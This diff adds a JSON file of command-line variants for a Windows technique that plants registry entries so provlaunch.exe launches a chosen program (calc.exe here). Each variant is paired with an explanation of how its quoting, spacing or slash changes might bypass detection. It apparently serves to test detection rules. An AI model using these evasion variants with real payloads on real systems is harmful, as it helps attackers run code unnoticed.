@@ -1,0 +1,26 @@
+[
+  {
+    "output": "cmd.exe /c reg.exe add HKLM\\\"SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\" /v altitude /t REG_DWORD /d 0 & reg add HKLM\\\"SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2\" /v Commandline /d calc.exe & c:\\windows\\system32\\provlaunch.exe LOLBin",
+    "explanation": "Inserted quotes around the registry path to test parsing behavior while maintaining the original intent of the command."
+  },
+  {
+    "output": "reg.exe  add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe",
+    "explanation": "Reordered and normalized spacing in the command line for testing if spacing variations can bypass detection."
+  },
+  {
+    "output": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0",
+    "explanation": "Used consistent spacing and normalized command structure to test if spacing variations can bypass detection."
+  },
+  {
+    "output": "provlaunch.exe \"SOFTWARE\\Microsoft\\Provisioning\\Commands\"",
+    "explanation": "Inserted quotes around the registry path to test parsing behavior while maintaining the original intent of the command."
+  },
+  {
+    "output": "provlaunch.exe SOFTWARE/Microsoft/Provisioning/Commands",
+    "explanation": "Replaced backslashes with forward slashes to test if path normalization can bypass detection."
+  },
+  {
+    "output": "provlaunch.exe SOFTWARE\\Microsoft\\Provisioning\\\\Commands",
+    "explanation": "Inserted an extra backslash to test if redundant escaping can bypass detection."
+  }
+]
